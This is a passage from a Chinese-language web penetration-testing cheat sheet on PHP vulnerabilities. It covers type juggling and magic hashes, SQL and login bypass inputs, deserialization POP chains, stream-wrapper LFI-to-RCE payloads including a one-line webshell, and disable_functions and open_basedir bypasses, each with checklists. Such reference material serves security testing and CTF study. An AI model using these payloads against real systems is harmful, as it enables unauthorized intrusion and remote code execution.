- [ ] 确认 Markdown 渲染功能存在
- [ ] 测试 HTML 混合模式是否开启
- [ ] 测试标准语法中的边界情况
- [ ] **重点测试嵌套/非标准结构**（解析器的最大弱点）
- [ ] 确认渲染后页面的 CSP 保护
- [ ] 如果是自定义解析器，检查源码中是否有 decode→reprocess 模式

## 9. PHP 特有漏洞

> PHP 语言特性导致的经典漏洞。遇到 PHP 站点（`.php` 文件 / `X-Powered-By: PHP/x.x` 响应头）时逐项检查。

### 9.1 类型混淆（Type Juggling / 弱类型比较）
PHP `==` 松散比较会隐式转换类型。

**高价值真值表**：
| 表达式 | 结果 | 机制 |
|---|---|---|
| `"0e12345" == "0e99999"` | **true** | 科学计数法都=0；哈希以 `0e` 开头全数字可碰撞 |
| `'0010e2' == '1e3'` | **true** | 都按 float 解析成 1000.0（非零也能撞，不只 0e） |
| `'123a' == 123` | **true** | 字符串转 int 在首个非数字处截断 |
| `"abc" == 0` | **true**（PHP **<8.0**；≥8.0 false）| 非数字字符串转 int 为 0 |
| `null == false == 0 == ""` | **true** | 松散相等网 |
| `'0' == false` | **true** | `'0'` 是唯一与 false 相等的非空字符串 |
| `"0x1e240" == 123456` | **true**（PHP<7.0） | 0x 开头字符串按十六进制解析成 int; 利用: 禁数字字符校验下传 `0xccccccccc`（hex 全字母）等值绕过 |
| `1.00000000000000010 == 1.0` | **true** | 浮点精度 10^-16 以下不可区分——`$n != intval($n)` 校验用超长小数尾绕过 |

**magic hash 实例表**：
| 算法 | 输入 | 摘要 |
|---|---|---|
| MD5 | `240610708` | `0e462097431906509019562988736854` |
| MD5 | `QNKCDZO` | `0e830400451993494058024219903391` |
| SHA-1 | `10932435112` | `0e07766915004133176347055865026311692244` |

- 利用：`md5($a)==md5($b) && $a!=$b` → `?a=240610708&b=QNKCDZO`；SHA-224/256 当搜索问题暴力
- HMAC 松散比较（`hash_hmac(...) != '0'`）：暴力 `$data`（时间戳/nonce）直到输出匹配 `^0e\d+$`
- **md5($pass, true) raw 注入**: `password=md5($pass,true)` 拼 SQL 时传 `ffifdyop`——raw 二进制 `276f7227...` 前几位即 `'or'6`，MySQL 把 hex 当 ascii 解释成永真式（万能密码变体）
- **强比较 MD5 碰撞**: `(string)` 强转堵死数组绕过且 `md5($s1)===md5($s2)` 时——fastcoll 生成两个 MD5 相同内容不同的二进制文件，urlencode 后作参数提交

**CTF 模式集**：
- 数组 `md5[]=1` / `?p[]=1`：`strcmp([],"x")` 返回 NULL，`NULL == 0` → 绕过（PHP 8 md5([]) 是 TypeError，老版本 NULL）
- `@sha1($x) == @sha1($y)`：两侧错成 NULL → `NULL == NULL` true
- `intval("0x1A",0)=26` / `intval("010",0)=8`（八进制，版本相关）/ `intval((float)"1e2")=100`
- `{"password": true}` json_decode 后 `true == 非空字符串`
- `is_numeric("0e12345")=true` 且 `"0e12345"==0` → 校验+比较双过
- 反序列化对象属性配 magic hash（`unserialize` 附近有哈希 `==`）

**first-pass payload**：`password[]=x` / `password=` / `0` / `0e12345` / `240610708` / `QNKCDZO` / `true` / `[]` / `admin%00`
**版本注意**：先从 X-Powered-By 定 PHP 大版本——7 的 payload 8 上可能失效（`md5([])`、`"abc"==0` 均有差异）
**防御对照**：`===` 严格比较 / `hash_equals()`（时序安全）；已用二者则此路不通

### 9.2 反序列化漏洞
`unserialize()` 触发对象的魔术方法（`__wakeup`/`__destruct`/`__toString`/`__get`）。若类中这些方法有危险操作（eval/file/include）→ 构造 **POP 链**。
- 入口：`unserialize($_COOKIE/$_POST/...)`；**phar 反序列化**：`phar://archive.phar` 触发元数据反序列化（无需 unserialize 调用）
- `__wakeup` 绕过（CVE-2016-7124，PHP <5.6.25 / <7.0.10）：序列化串里属性数声明**大于实际**时 `__wakeup` 不调用
- 工具：phpggc 生成常见框架（Laravel/Symfony/Monolog）的 payload

### 9.3 伪协议（Stream Wrapper）利用
LFI 升级为读源码/RCE：
- `php://filter/convert.base64-encode/resource=index.php` → 读 PHP 源码（绕过执行）
- `php://input` + POST body（`<?php system($_GET['c']);?>`）→ RCE（需 allow_url_include=On）
- `data://text/plain;base64,PD9waHAg...` → 直接执行（需 allow_url_include=On）
- `phar://x.phar` → 触发反序列化（见 9.2）
- `zip://upload.jpg#shell.php` → 配合上传的 zip 内 shell

### 9.4 disable_functions 绕过
`disable_functions` 禁用 system/exec/shell_exec 等时的绕过：
- **LD_PRELOAD**：`putenv("LD_PRELOAD=evil.so")` + `mail()`/`error_log()`（启动 sendmail 子进程加载 so; so 内劫持 geteuid 等函数、payload 里 `unsetenv("LD_PRELOAD")` 防递归; 命令经 `putenv("EVIL_CMDLINE=...")` 传入 + 输出重定向文件再读）
- **iconv（CVE-2024-2961）**：glibc iconv 缓冲区溢出，影响 PHP <8.3.7 / <7.4.30，可 RCE
- **FFI**：`$ffi = FFI::cdef(...); $ffi->system(...)`（需 FFI.enable）
- **imap_open / pcntl_exec / mail mta**：未禁用的函数

**open_basedir 绕过**（目录限制而非函数禁用）: ①`glob://` 协议不受 open_basedir 限制——`new DirectoryIterator('glob:///*')` 枚举根目录 ②`ini_set('open_basedir','..')` 相对路径逐级上跳后 chdir+ini_set 重设（脚本套路） ③php7 backtrace UAF（Exception getTrace 泄漏字符串指针→伪造 closure→定位 zif_system 直调——php-src UAF PoC 网传脚本，version-sensitive 按版本找对应 PoC）

### 9.5 其他 PHP 高频点
- 命令注入：`system($cmd)` 未过滤 → `; | && || $()` 分隔符
- `preg_replace('/pat/e', $replace, $subj)`：`/e` 修饰符对 `$replace` 做 eval（PHP **<7.0**）
- 参数污染：`?a[]=1&a[]=2` 让期望标量的函数收到数组（类型混淆绕过）
- `intval()` 截断：`intval("0123")`=83（八进制）、`intval("1e5")`=1；**intval($num,0) 进制族绕 intval===N 校验**: `0x` 十六进制（弱比较 `$num!=N` 先过、intval 第二参 0 按前缀自动进制）、`0` 前缀八进制（禁 0 开头时加 `+` 前缀 `+010574`——`+` 被 is_numeric 接受且 strpos 检测不到前导 0）、浮点 `4476.0`（`$num==="4476"` 强比较不等于但 intval 后相等，仅弱比较第一层可用）
- `extract($_GET)` 变量覆盖：默认 EXTR_OVERWRITE 覆盖已有变量（$auth/$is_admin/$db_password）→ 组合链 `include($template.".php")`；`?GLOBALS[admin]=1` 仅 PHP<8.1；同族 grep: `parse_str($q)` 无第二参、`$$var` 可变变量、`import_request_variables()`（5.4 移除）
- **parse_str($_SERVER['QUERY_STRING']) 伪造超全局**: GET 传 `?_POST[key]=v` → QUERY_STRING 解析路径直接生成 $_POST['key']——绕 `isset($_POST['x'])` 类"禁止直接传参"检查；extract($_POST) 后续命中；$_COOKIE 同理
- **参数名 `[` 后字符不转 _**: 空格/+/`[` 转下划线，但首个 `[` 转 _ 后其余字符原样保留——传 `CTF[SHOW.COM=1` 得变量名 `CTF_SHOW.COM`（直接传点号会被转 _）；构造带点变量名唯一方法
- **= 优先级高于 and 的赋值截断**: `$v0 = is_numeric($v1) and is_numeric($v2)` 只把第一个表达式赋给 $v0——v1 传数字后续 v2/v3 任意（&& 则相反先算右值不可截断；审计见 and/or 链式赋值立即判定）
- **%0c 绕 trim+is_numeric**: trim 剥离集（空格/\t/\n/\r/\0/\x0B）不含 \f，is_numeric 接受前导 \f——`%0c36` 通过 is_numeric 且 trim 后 !=='36' 而 =='36' 弱比较成立；通用法: 128 字符循环探测 `trim(chr(i).'36')!=='36' && is_numeric(...)` 找可用前缀

### 检查清单
- [ ] 比较 token/密码/哈希用 `==` 还是 `===`？（9.1）
- [ ] 有无 `unserialize` 入口 / phar 处理？（9.2）
- [ ] LFI 能否用伪协议读源码或 RCE？（9.3）
- [ ] `disable_functions` 列了什么？哪些可用（mail/putenv/FFI）？（9.4）
- [ ] PHP 版本？（决定 <8.0 弱类型、<7 的 `/e`、iconv CVE 是否适用）
### 9.6 PHP 边界与非预期行为
- **intval 溢出回绕**: intval(超 PHP_INT_MAX 的 float) 实现定义——`intval(1024819115206086201*9)`→INT_MIN; 链式凑 mod 值。INF==INF: `7E1000`>DBL_MAX→INF，两侧 INF 平凡过数学等价校验
- **数组参数三连**: `nonce[]=x`→hash_hmac 返 NULL（后续作 key=空 key 可预计算）; content[] 数组拼接绕单串正则; eregi %00 截断（PHP<7）
- **无字母执行**: `''+[]`="Array" + `$s++` 字符自增构造任意函数名 + 可变函数调用
- **递归 urldecode**: %25 嵌套 N 层=精确控制解码轮数（不动点=无 % 残留）
- **uniqid 文件名**: 前 8 hex=Unix 秒级时间戳——Date 头对齐后 <100 请求命中


